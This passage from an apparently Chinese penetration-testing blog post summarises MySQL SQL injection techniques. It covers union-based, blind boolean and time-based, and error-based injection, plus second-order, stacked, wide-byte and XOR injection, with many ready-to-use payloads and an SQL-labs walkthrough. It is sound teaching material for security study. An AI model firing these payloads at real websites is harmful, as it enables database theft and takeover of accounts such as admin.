+<li>information_schema.TABLES -&gt; TABLE_SCHEMA</li>
+<li>information_schema.TABLE_CONSTRAINTS -&gt; CONSTRAINT_SCHEMA, TABLE_SCHEMA</li>
+<li>mysql.INNODB_INDEX_STATS -&gt; database_name</li>
+<li>mysql.INNODB_TABLE_STATS -&gt; database_name</li>
+</ul>
+</li>
+<li><p>table</p>
+<ul>
+<li>information_schema.COLUMNS -&gt; TABLE_NAME</li>
+<li>information_schema.KEY_COLUMN_USAGE -&gt; TABLE_NAME, REFERENCED_TABLE_NAME</li>
+<li>information_schema.PARTITIONS -&gt; TABLE_NAME</li>
+<li>information_schema.STATISTICS -&gt; TABLE_NAME</li>
+<li>information_schema.TABLES -&gt; TABLE_NAME</li>
+<li>information_schema.TABLE_CONSTRAINTS -&gt; TABLE_NAME</li>
+<li>mysql.INNODB_INDEX_STATS -&gt; table_name</li>
+<li>mysql.INNODB_TABLE_STATS -&gt; table_name</li>
+</ul>
+</li>
+<li><p>column</p>
+<ul>
+<li>information_schema.COLUMNS -&gt; COLUMN_NAME</li>
+<li>information_schema.KEY_COLUMN_USAGE -&gt; COLUMN_NAME, REFERENCED_COLUMN_NAME</li>
+<li>information_schema.STATISTICS -&gt; COLUMN_NAME</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>mysql的查询语句完整格式如下：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    [ALL | DISTINCT | DISTINCTROW ]</span><br><span class="line">      [HIGH_PRIORITY]</span><br><span class="line">      [STRAIGHT_JOIN]</span><br><span class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [FROM table_references</span><br><span class="line">      [PARTITION partition_list]</span><br><span class="line">    [WHERE where_condition]</span><br><span class="line">    [GROUP BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ... [WITH ROLLUP]]</span><br><span class="line">    [HAVING where_condition]</span><br><span class="line">    [ORDER BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ...]</span><br><span class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</span><br><span class="line">    [PROCEDURE procedure_name(argument_list)]</span><br><span class="line">    [INTO OUTFILE &apos;file_name&apos;</span><br><span class="line">        [CHARACTER SET charset_name]</span><br><span class="line">        export_options</span><br><span class="line">      | INTO DUMPFILE &apos;file_name&apos;</span><br><span class="line">      | INTO var_name [, var_name]]</span><br><span class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2><span id="0x04-mysql相关">0x04 Mysql相关</span></h2><ul>
+<li><p>在MySQL 5+版本后，加入了information_schema这个库，该库存放了所有数据库的信息，<strong>记录当前数据库的数据库，表，列，用户权限等信息</strong></p>
+</li>
+<li><p><strong>information_schema.schemata包含所有数据库的名</strong></p>
+<ul>
+<li>字段<ul>
+<li>schema_name 数据库名</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>information_schema.tables包含所有库的表名</strong></p>
+<ul>
+<li>字段<ul>
+<li>table_schema 数据库名</li>
+<li>table_name 表名</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>information_schema.columns包含所有表的字段</strong></p>
+<ul>
+<li>字段<ul>
+<li>table_schema 数据库名</li>
+<li>table_name 表名</li>
+<li>column_name 列名</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2><span id="0x05-mysql注入">0x05 Mysql注入</span></h2><h3><span id="联合查询注入">联合查询注入</span></h3><ul>
+<li><p>执行SQL查询，其结果能回显到页面中，那么可直接进行有回显的SQL注入，我们通常使用联合查询注入法</p>
+</li>
+<li><p>其作用就是，在原来查询条件的基础上，通过系统关键字union从而拼接上我们自己的select语句，后个select得到的结果将拼接到前个select的结果后边。如：前个select得到2条数据，后个select得到1条数据，那么后个select的数据将作为第3条拼接到第一个select返回的内容中，其字段名将按照位置关系进行继承。</p>
+</li>
+<li><p>如：</p>
+<p>  <code>正常查询语句 union select columns_name from (database.)table_name where condition</code></p>
+</li>
+<li><p>这里需要注意的是：</p>
+<ul>
+<li><p>若回显仅支持一行数据的话，记得让前边正常的查询语句返回的结果为空。</p>
+</li>
+<li><p>使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接。</p>
+<p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+</code></p>
+</li>
+</ul>
+</li>
+<li><p>联合查询注入步骤 </p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//查询语句</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">    </span><br><span class="line">SELECT * FROM test WHERE id=&apos;$id&apos; LIMIT 0,1;</span><br><span class="line"></span><br><span class="line">//判断字段数</span><br><span class="line"></span><br><span class="line">?id=1&apos; ORDER BY 3--+</span><br><span class="line"></span><br><span class="line">//判断显示位</span><br><span class="line"></span><br><span class="line">?id=-1&apos; UNION SELECT 1,2,3--+</span><br><span class="line"></span><br><span class="line">//利用函数获得信息</span><br><span class="line"></span><br><span class="line">?id=-1 UNION SELECT 1,(version()),3--+</span><br><span class="line"></span><br><span class="line">//爆库</span><br><span class="line"></span><br><span class="line">?id=-1&apos; UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),3--+ //用LIMIT来定位查询，一个一个爆数据库</span><br><span class="line"></span><br><span class="line">?id=-1&apos; UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--+ //用group_concat()实现一个显示位爆出该字段下所有记录；注：group_concat函数是要连接的字段</span><br><span class="line"></span><br><span class="line">//爆表</span><br><span class="line">?id=-1&apos; UNION SELECT 1,(SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;security&apos; LIMIT 0,1),3--+</span><br><span class="line"></span><br><span class="line">//爆字段</span><br><span class="line"></span><br><span class="line">?id=-1&apos; UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema=&apos;security&apos; AND table_name=&apos;users&apos; LIMIT 0,1),3--+</span><br><span class="line"></span><br><span class="line">//爆数据</span><br><span class="line">?id=-1&apos; UNION SELECT 1,(SELECT username FROM security.users LIMIT 0,1),3--+</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h3><span id="无回显">无回显</span></h3><ul>
+<li><p>什么叫无回显？之前举得登录判断就是一个无回显的例子。如果SQL语句存在返回的数据，那么页面输出为success，若不存在返回的数据，则输出fail。</p>
+</li>
+<li><p>与有回显情况不同的是：无回显的页面输出内容并不是SQL语句返回的内容。</p>
+</li>
+<li><p>对于无回显的情况，我们通常可用两种方法进行注入：报错注入与盲注。</p>
+</li>
+</ul>
+<h3><span id="盲注">盲注</span></h3><h4><span id="bool盲注">bool盲注</span></h4><ul>
+<li><p>如果既没有可控回显点，也没有报错信息，但是页面有正常和异常两种显示，我们就可以构造查询，通过页面状态判断猜解是否正确，其实是爆破的一种类型，本质上是一个字符一个字符的猜解，常用函数：</p>
+<p>  <code>1、LENGTH(s): 返回字符串 s 的长度</code><br>  <code>2、LEFT(s,n)：返回字符串 s 的前 n 个字符</code><br>  <code>3、ASCII(s)：返回字符串 s 的第一个字符的 ASCII 码</code><br>  <code>4、SUBSTR(s, start, length)：从字符串 s 的 start 位置截取长度为 length 的子字符串</code><br>  <code>5、MID、SUBSTR、SUBSTRING 一样</code></p>
+</li>
+<li><p>简单例子：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and (length(database()))&gt;10;</span><br><span class="line">1&apos; and ascii(substr((select database()),1,1)&gt;144;</span><br><span class="line">1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;60;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4><span id="时间盲注">时间盲注</span></h4><ul>
+<li><p>如果没有可控的回显点，没有报错信息，bool真假页面无变化，可以考虑延时注入，常用函数如下：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SLEEP (pauses)：休眠，参数为休眠的时长，单位秒</span><br><span class="line">IF(expr1,expr2,expr3)：判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br><span class="line">FIND_IN_SET(string, string_list)：返回字符串列表中字符串的位置</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>简单例子：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or sleep(2);</span><br><span class="line">1&apos; and if(ascii(substr(database(),1,1))&gt;115,0,sleep(5));</span><br><span class="line">1&apos; union select 1,2,sleep(find_in_set(mid(@@version, 1, 1), &apos;0,1,2,3,4,5,6,7,8,9,.&apos;));</span><br><span class="line">1&apos; and if(ascii(substring((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=116,sleep(5),1);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其他数据库的延时函数：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mysql： BENCHMARK(100000,MD5(1))  or sleep(5) </span><br><span class="line">Postgresql： PG_SLEEP(5)   OR GENERATE_SERIES(1,10000) </span><br><span class="line">Mssql： WAITFOR DELAY &apos;0:0:5&apos;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3><span id="报错注入">报错注入</span></h3><ul>
+<li>速查能力表<ul>
+<li>默认 MYSQL_ERRMSG_SIZE = 512</li>
+</ul>
+</li>
+<li>优先考虑函数显错长度，若函数回显长度未限制，则考虑Mysql报错内容长度限制</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>函数</th>
+<th>版本需求</th>
+<th>5.5.x</th>
+<th>5.6.x</th>
+<th>5.7.x</th>
+<th>8.x</th>
+<th>函数显错长度</th>
+<th>Mysql报错内容长度</th>
+<th>额外限制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主键重复</td>
+<td>floor、round</td>
+<td>❓</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td>64</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>列名重复</td>
+<td>name_const</td>
+<td>❓</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>join</td>
+<td>[5.5.49, ?)</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>数据溢出 - Double</td>
+<td></td>
+<td>[5.5.5, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>MYSQL_ERRMSG_SIZE</td>
+<td></td>
+</tr>
+<tr>
+<td>数据溢出 - BIGINT</td>
+<td>1e308 cot exp pow</td>
+<td>[5.5.5, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>MYSQL_ERRMSG_SIZE</td>
+<td></td>
+</tr>
+<tr>
+<td>几何对象</td>
+<td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td>
+<td>[?, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>244</td>
+<td></td>
+</tr>
+<tr>
+<td>空间函数 Geohash</td>
+<td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td>
+<td>[5.7, ?)</td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td>✔️</td>
+<td>128</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>GTID</td>
+<td>gtid_subset gtid_subtract</td>
+<td>[5.6.5, ?)</td>
+<td></td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>200</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>JSON</td>
+<td>json_*</td>
+<td>[5.7.8, 5.7.11]</td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td></td>
+<td>200</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>UUID</td>
+<td>uuid_to_bin bin_to_uuid</td>
+<td>[8.0, ?)</td>
+<td></td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td>128</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>XPath</td>
+<td>extractvalue updatexml</td>
+<td>[5.1.5, ?)</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>32</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4><span id="xpath语法错误-updatexml">Xpath语法错误-updatexml()</span></h4><ul>
+<li><p>使用条件：mysql版本&gt;5.1.5</p>
+</li>
+<li><p>函数语法：updatexml(XML_document, XPath_string, new_value);</p>
+<ul>
+<li><p>第一个参数：XML_document是String格式，为XML文档对象的名称 </p>
+</li>
+<li><p>第二个参数：XPath_string (Xpath格式的字符串) </p>
+</li>
+<li><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+</li>
+<li><p>我们通常在第二个xpath参数填写我们要查询的内容。与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p>
+</li>
+</ul>
+</li>
+<li><p>Payload构造：</p>
+<p>  <code>mysql&gt; select updatexml(1,concat(0x7e,version(),0x7e),1);</code></p>
+<p>  <img src="/2020/01/05/渗透测试-MYSQL注入总结/15833938113421.jpg" alt="-w698"></p>
+</li>
+</ul>
+<pre><code>`mysql&gt; select extractvalue(1,concat(0x7e,user(),0x7e));`
+
+![-w710](/渗透测试-MYSQL注入总结/15833936642377.jpg)</code></pre><ul>
+<li><strong>前后添加~使其不符合xpath格式从而报错,因为Xpath语法只有遇到特殊字符时才会报错</strong></li>
+</ul>
+<h4><span id="xpath语法错误-extractvalue">Xpath语法错误-extractvalue()</span></h4><ul>
+<li><p>原理分析</p>
+<ul>
+<li><p>extractvalue(xml_str , Xpath) 函数,按照Xpath语法从XML格式的字符串中提取一个值，如果函数中任意一个参数为NULL,返回值都是NULL。</p>
+</li>
+<li><p>其实就是对XML文档进行查询的函数，相当于HTML文件中用$\color{red}{<div><p><a>}$等标签查找元素一样，第一个参数传入目标xml文档，第二个参数使用Xpath路径法表示的查找路径.</a></p>
+</div></p></li>
+<li><p>举个简单例子：</p>
+<p>  <code>select extractvalue(&#39;&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;&#39;,&#39;/a/c&#39;);</code></p>
+</li>
+<li><p>寻找前一段xml文档内容中的a节点下的c节点</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------------------------------------------------+</span><br><span class="line">| extractvalue(&apos;&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;/c&gt;aaaa&lt;/a&gt;&apos;,&apos;/a/c&apos;) |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| accc                                                     |</span><br><span class="line">+----------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>使用条件：Mysql版本&gt;5.1.5</p>
+</li>
+<li><p>函数语法：EXTRACTVALUE (XML_document, XPath_string);</p>
+</li>
+<li><p>利用原理与updatexml函数相同</p>
+</li>
+<li><p>payload: </p>
+<p>  <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p>
+<p>  <img src="/2020/01/05/渗透测试-MYSQL注入总结/15833987855105.jpg" alt="-w770"></p>
+</li>
+</ul>
+<h4><span id="floor报错注入">floor()报错注入</span></h4><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));</span><br><span class="line">/*</span><br><span class="line">concat: 连接字符串</span><br><span class="line">floor: 取float的整数值</span><br><span class="line">rand: 取0~1之间随机浮点值</span><br><span class="line">group by: 根据一个或多个列对结果集进行分组并有排序功能</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></code></pre><h4><span id="exp报错注入">exp()报错注入</span></h4><ul>
+<li><p>函数语法：exp(int)</p>
+</li>
+<li><p>适用版本：5.5.5~5.5.49，之后已不再支持溢出注入攻击</p>
+</li>
+<li><p>利用原理：<a href="https://netsecurity.51cto.com/art/201508/489529.htm" target="_blank" rel="noopener">引自</a></p>
+<ul>
+<li>以 e 为底指数函数求值，配合~取反函数进行整数溢出报错</li>
+<li>利用MySQL中的Double型数据溢出，当传递一个大于709的值时，函数exp()就会引起一个溢出错误。<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15834227787798.jpg" alt="-w831"></li>
+</ul>
+</li>
+<li><p>$\color{red}{注入Payload：}$select exp(~(select * FROM(SELECT USER())a));</p>
+</li>
+<li><p>其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函数内，得到的结果将超过mysql的double数组范围，从而报错输出.</p>
+</li>
+</ul>
+<h4><span id="bigint数值操作">Bigint数值操作</span></h4><ul>
+<li>利用原理：当mysql数据库的某些边界数值进行数值运算时，会报错的原理。    </li>
+<li>如~0得到的结果：18446744073709551615</li>
+<li>若此数参与运算，则很容易会错误。</li>
+<li>payload:<br>  <code>select !(select * from(select user())a)-~0;</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Storage (Bytes)</th>
+<th>Minimum Value Signed</th>
+<th>Minimum Value Unsigned</th>
+<th>Maximum Value Signed</th>
+<th>Maximum Value Unsigned</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TINYINT</td>
+<td>1</td>
+<td>-128</td>
+<td>0</td>
+<td>127</td>
+<td>255</td>
+</tr>
+<tr>
+<td>SMALLINT</td>
+<td>2</td>
+<td>-32768</td>
+<td>0</td>
+<td>32767</td>
+<td>65535</td>
+</tr>
+<tr>
+<td>MEDIUMINT</td>
+<td>3</td>
+<td>-8388608</td>
+<td>0</td>
+<td>8388607</td>
+<td>16777215</td>
+</tr>
+<tr>
+<td>INT</td>
+<td>4</td>
+<td>-2147483648</td>
+<td>0</td>
+<td>2147483647</td>
+<td>4294967295</td>
+</tr>
+<tr>
+<td>BIGINT</td>
+<td>8</td>
+<td>-2^63=-9223372036854775807</td>
+<td>0</td>
+<td>2^63-1=9223372036854775807</td>
+<td>2^64-1=18446744073709551615</td>
+</tr>
+</tbody></table>
+<h4><span id="不存在的函数">不存在的函数</span></h4><ul>
+<li>利用原理：利用不存在的函数，可能会得到当前所在的数据库名称。<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15834815952180.jpg" alt="-w827"></li>
+</ul>
+<h4><span id="列名重复-name_const">列名重复-name_const()</span></h4><ul>
+<li><p>mysql 列名重复也会报错，缺点目前只能报版本号</p>
+</li>
+<li><p>payload:<br>  <code>select * from (select name_const(version(),0x1),name_const(version(),0x1))a;</code></p>
+<p>  <img src="/2020/01/05/渗透测试-MYSQL注入总结/15837622996586.jpg" alt="-w884"></p>
+</li>
+</ul>
+<h4><span id="join-using注列名">join using()注列名</span></h4><ul>
+<li><p>适用版本：需要 version &gt;= 5.5.49 才可使用</p>
+</li>
+<li><p>利用原理：</p>
+<ul>
+<li><p>通过系统关键词join可建立两个表之间的内连接。</p>
+</li>
+<li><p>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</p>
+</li>
+<li><p>并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">mysql&gt;select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+</li>
+</ul>
+<h4><span id="gtid相关函数">GTID相关函数</span></h4><ul>
+<li><p>适用版本：需要 version =&gt; 5.6.5 才可使用</p>
+</li>
+<li><p>利用原理：参数格式不正确。</p>
+</li>
+<li><p>Payload：<br><code>select target_function(&lt;payload&gt;, 0);</code></p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;select gtid_subset(user(),1);</span><br><span class="line">mysql&gt;select gtid_subset(hex(substr((select * from users limit 1,1),1,1)),1);</span><br><span class="line">mysql&gt;select gtid_subtract((select * from(select user())a),1);</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="/2020/01/05/渗透测试-MYSQL注入总结/15837676684897.jpg" alt="-w798"></p>
+</li>
+</ul>
+<h3><span id="二次注入">二次注入</span></h3><h4><span id="涉及函数">涉及函数</span></h4><ul>
+<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</li>
+<li>mysql_r    - mysql_real_escape_string() 函数转义 SQL 语句中</li>
+<li>mysql_escape_string() — 转义一个字符串</li>
+</ul>
+<h4><span id="漏洞原理">漏洞原理</span></h4><ul>
+<li><p>用户构造恶意数据存储在数据库，当数据库再次读取此数据时候造成注入。开发者对用户输入的数据做了过滤或者转义等处理，但写进数据库的还是“脏数据”，当 Web 应用调用“脏数据”时候发生了注入，概括起来很简单：</p>
+<ul>
+<li>1、恶意数据的写入</li>
+<li>2、恶意数据的调用</li>
+</ul>
+<p>如下图所示：<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15837692093873.jpg" alt></p>
+</li>
+</ul>
+<h4><span id="题目实战">题目实战</span></h4><p>SQL-labs24关便涉及到二次注入<br>先来看一下登陆时的源码<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15837698120684.jpg" alt="-w622"><br>过滤函数将特殊符号给过滤掉了，所以直接注入是没戏的<br>再来查看一下用户注册的源码<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15837698674252.jpg" alt="-w610"><br>同样过滤特殊字符，从注册进行注入也是不可能了<br>最后看一下修改密码的源码<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15837698890518.jpg" alt="-w617"><br>同样如此，那就只能利用二次注入，先将恶意语句注入进数据库中，再调用<br>我们先注册一个用户admin’#,密码设置为123，注册好之后查看一下数据库<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15837699078194.jpg" alt><br>注册成功，这时其实我们就可以修改管理员admin，为什么那，来看下修改密码的sql语句<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15837699241059.jpg" alt><br>我们用户名为admin’#，调用该用户时，SQL语句则变为了<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15837699499581.jpg" alt="-w690"></p>
+<h3><span id="堆叠注入">堆叠注入</span></h3><h4><span id="涉及字符">涉及字符</span></h4><ul>
+<li>分号（;），在SQL语句中用来表示一条sql语句的结束</li>
+</ul>
+<h4><span id="原理分析">原理分析</span></h4><ul>
+<li><p>堆叠注入可以执行任意的语句 ，多条sql 语句一起执行。在MYSQL命令框中，常以;作为结束符，那我们便可以在一句SQL语句结束后再紧跟一句SQL语句 。</p>
+</li>
+<li><p>查数据库<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15837702846548.jpg" alt="-w578"></p>
+</li>
+<li><p>但堆叠注入是有局限性的，并不是每个环境都可以用到的:</p>
+<ul>
+<li>1、可能受到API或者数据库引擎不支持的限制 </li>
+<li>2、权限不足</li>
+</ul>
+</li>
+</ul>
+<h3><span id="宽字节注入">宽字节注入</span></h3><h4><span id="涉及函数">涉及函数</span></h4><ul>
+<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</li>
+<li>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符</li>
+<li>mysql_escape_string() — 转义一个字符串</li>
+</ul>
+<h4><span id="漏洞原因">漏洞原因</span></h4><ul>
+<li><p>为了防止 SQL 注入，PHP 提供了对特殊字符的转义功能：</p>
+<p>  <code>1、magic_quotes_gpc=On，PHP配置，GPPC 在 PHP5.4 之后已经被官方移除。
+  2、addslashes，PHP函数。</code></p>
+</li>
+<li><p>这两种方法都是为了实现一个功能，为 POST、GET、COOKIE、$SERVER（该变量不受GPC保护） 过来的特殊字符前加反斜杠 \（也就是做转义），如单引号 ‘、双引号 “、反斜线 \、NULL（NULL 字符）等，但就是这个防止 SQL 注入的功能，成了 SQL 注入的突破点，为避免用户过度依赖这个不是特别安全的函数，GPC 在 PHP5.4 之后已经被官方移除。下面看看漏洞产生的过程：</p>
+<p>  <code>1、构造语句 %df%27（%27 是单引号 &#39; ） ；
+  2、首先 addslashes 会在单引号前加反斜杠转义，变成 %df%5c%27（%5c 是反斜杠 \ ）；
+  3、然后因为数据库设置了 GBK 编码，GBK 是双字节编码，发现 %df%5c 在其汉字编码范围内，于是 %df%5c 被转换成”運”，单引号 %27 逃逸；
+  4、最后MySQL查询时候执行的其实是 運&#39;，单引号可闭合代码造成注入漏洞。
+  5、过程 %df%27–(addslashes)–%df%5c%27–(GBK编码)–運’</code></p>
+</li>
+</ul>
+<h3><span id="异或注入">异或注入</span></h3><h4><span id="涉及符号">涉及符号</span></h4><ul>
+<li>MySQL中，异或用^或xor表示</li>
+</ul>
+<h4><span id="原理分析">原理分析</span></h4><ul>
+<li><p>异或注入原理较为简单一些，运算法则就是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null</p>
+</li>
+<li><p>简单在mysql命令行演示一下：<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15838167660722.jpg" alt="-w533"></p>
+</li>
+<li><p>用异或方法可以判断一些字符是否被过滤，如:<br><img src="/2020/01/05/渗透测试-MYSQL注入总结/15838173462542.jpg" alt="-w627"></p>
+</li>
+</ul>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/" title="MYSQL注入总结" target="_blank" rel="external">http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="" target="_blank"><span class="text-dark">VK</span><small class="ml-1x">VK&#39;Blog</small></a></h3>
+        <div>生如蝼蚁，当立鸿鹄之志。命如薄纸，却有不屈之心。乾坤未定，你我皆是黑马，祝你我飞黄腾达前程似锦。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
